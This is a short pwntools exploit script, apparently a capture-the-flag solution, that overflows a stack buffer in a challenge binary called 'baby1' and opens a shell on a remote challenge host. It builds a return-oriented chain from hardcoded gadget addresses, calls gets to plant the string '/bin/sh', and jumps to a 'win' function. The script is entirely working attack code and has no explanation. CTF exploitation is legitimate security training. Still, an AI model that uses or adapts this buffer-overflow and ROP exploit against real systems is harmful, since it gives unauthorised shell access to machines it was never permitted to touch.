from pwn import *

_binsh = p64(0x00400286)
_win = p64(0x00400698)
_poprdi = p64(0x00400793) # pop rdi ; ret
_gets = p64(0x00400580)   # gets func
_addr = p64(0x00602028)   # my binsh addr

payload = b"A" * 16 + b"rbp4rbp8"
payload += _poprdi
payload += _addr
payload += _gets
payload += _poprdi
payload += _addr
payload += _win

# r = process('./baby1')
r = remote('baby-01.pwn.beer', 10001)
r.recvuntil("input: ")
r.sendline(payload)
r.sendline("/bin/sh\x00")
r.interactive()
